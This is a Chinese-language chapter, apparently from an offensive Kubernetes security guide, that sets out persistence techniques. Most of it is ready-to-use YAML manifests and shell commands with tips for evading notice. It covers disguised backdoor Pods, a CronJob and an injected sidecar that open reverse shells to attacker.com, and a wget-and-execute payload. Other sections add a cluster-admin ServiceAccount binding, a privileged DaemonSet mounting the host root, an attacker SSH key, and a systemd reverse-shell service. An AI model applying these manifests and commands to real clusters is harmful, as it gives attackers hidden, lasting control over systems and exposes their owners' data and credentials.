# 第7章 持久化技术

### 7.1 后门Pod部署

#### 7.1.1 隐蔽Pod部署

创建不明显的后门Pod，保持长期访问。

**隐蔽技巧：**
- 使用与系统组件相似的名称（如`kube-flannel-backdoor`）
- 部署在`kube-system`等系统命名空间
- 使用常见的镜像名称和标签
- 设置合理的资源限制，避免引起注意
- 不暴露Service端口，使用反向连接

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: kube-proxy-backdoor
  namespace: kube-system
  labels:
    k8s-app: kube-proxy-backdoor
    tier: node
spec:
  containers:
  - name: backdoor
    image: k8s.gcr.io/pause:3.6  # 使用常见镜像
    command:
    - /bin/sh
    - -c
    - |
      # 下载后门程序并执行
      wget http://attacker.com/backdoor -O /tmp/backdoor
      chmod +x /tmp/backdoor
      /tmp/backdoor reverse-shell attacker.com 4444
    resources:
      requests:
        cpu: 10m
        memory: 16Mi
      limits:
        cpu: 100m
        memory: 64Mi
  restartPolicy: Always
  nodeSelector:
    kubernetes.io/os: linux
```

#### 7.1.2 静态Pod持久化

在控制平面节点上，kubelet会监视`/etc/kubernetes/manifests/`目录，目录中的Pod定义文件会被自动创建为静态Pod。

```bash
# 在控制平面节点上创建静态Pod
cat > /etc/kubernetes/manifests/etcd-backdoor.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: etcd-backdoor
  namespace: kube-system
spec:
  hostNetwork: true
  containers:
  - name: backdoor
    image: alpine:3.18
    command: ["sleep", "infinity"]
    volumeMounts:
    - name: etcd-certs
      mountPath: /etc/kubernetes/pki/etcd
  volumes:
  - name: etcd-certs
    hostPath:
      path: /etc/kubernetes/pki/etcd
EOF
```

### 7.2 CronJob持久化

#### 7.2.1 CronJob后门

利用K8s的CronJob资源实现定期执行的后门。

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-updater
  namespace: kube-system
spec:
  schedule: "*/30 * * * *"  # 每30分钟执行一次
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: cronjob-sa
          containers:
          - name: updater
            image: busybox
            command:
            - /bin/sh
            - -c
            - |
              # 反向shell
              sh -i >& /dev/tcp/attacker.com/4444 0>&1
          restartPolicy: OnFailure
```

#### 7.2.2 高权限CronJob

为CronJob分配高权限的ServiceAccount，定期执行命令维持访问。

```bash
# 创建高权限ServiceAccount
kubectl create sa system-maintenance -n kube-system
kubectl create clusterrolebinding system-maintenance \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:system-maintenance
```

### 7.3 控制器篡改

#### 7.3.1 修改现有Deployment

篡改已有的Deployment，注入后门容器（Sidecar注入）。

```bash
# 修改现有Deployment，添加后门容器
kubectl patch deployment <existing-deploy> -n <namespace> --type=json -p='
[
  {
    "op": "add",
    "path": "/spec/template/spec/containers/-",
    "value": {
      "name": "sidecar-logger",
      "image": "busybox:latest",
      "command": ["/bin/sh", "-c", "while true; do sh -i >& /dev/tcp/attacker.com/4444 0>&1; sleep 3600; done"]
    }
  }
]'
```

#### 7.3.2 DaemonSet持久化

DaemonSet会在每个节点上运行一个Pod副本，非常适合全节点持久化。

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-exporter-backdoor
  namespace: monitoring
  labels:
    app: node-exporter
spec:
  selector:
    matchLabels:
      app: node-exporter
  template:
    metadata:
      labels:
        app: node-exporter
    spec:
      hostPID: true
      hostNetwork: true
      containers:
      - name: node-exporter
        image: prom/node-exporter:v1.5.0
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /
```

### 7.4 节点持久化

#### 7.4.1 SSH密钥持久化

```bash
# 追加SSH公钥到root用户
echo "ssh-rsa AAAAB3NzaC1yc2EAAA... attacker@evil.com" >> /root/.ssh/authorized_keys

# 检查sshd配置，确保允许root登录
cat /etc/ssh/sshd_config | grep PermitRootLogin
```

#### 7.4.2 系统服务后门

```bash
# 创建系统服务
cat > /etc/systemd/system/system-update.service <<EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/system-update.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

cat > /usr/local/bin/system-update.sh <<EOF
#!/bin/bash
# 反向shell
while true; do
  bash -i >& /dev/tcp/attacker.com/443 0>&1
  sleep 300
done
EOF

chmod +x /usr/local/bin/system-update.sh
systemctl enable system-update.service
systemctl start system-update.service
```

#### 7.4.3 控制平面持久化

如果获得了控制平面节点的权限，可以进行更深度的持久化：

1. **篡改API Server配置**：添加额外的认证方式
2. **篡改etcd数据**：创建隐藏的管理员账户
3. **Webhook注入**：添加恶意的Admission Webhook
4. **证书篡改**：植入后门证书
